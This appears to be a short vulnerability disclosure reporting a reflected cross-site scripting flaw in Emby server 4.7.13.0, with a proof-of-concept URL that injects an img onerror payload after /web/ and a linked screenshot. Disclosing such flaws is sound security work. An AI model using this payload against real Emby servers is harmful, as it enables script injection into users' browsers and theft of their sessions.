# Vulnerability Description
I found a Reflected Cross-Site Scripting （XSS） in the latest version of Emby server version  4.7.13.0

official address：
https://emby.media/
[https://github.com/MediaBrowser/Emby.Releases](https://github.com/MediaBrowser/Emby.Releases/releases/download/4.7.13.0/embyserver-win-x64-4.7.13.0.7z)

# Vulnerability Details

Everything after /web/ is reflected. See the attachments for an example: 
```
http://<ip>:<port>/web/%3Cimg%20sRc=l%20oNerrOr=alert('xss')%20x%3E
```

![image](https://github.com/whoamiecho/vuls/assets/6848485/f134d630-aa3f-4a12-a425-cc754dfd95f2)




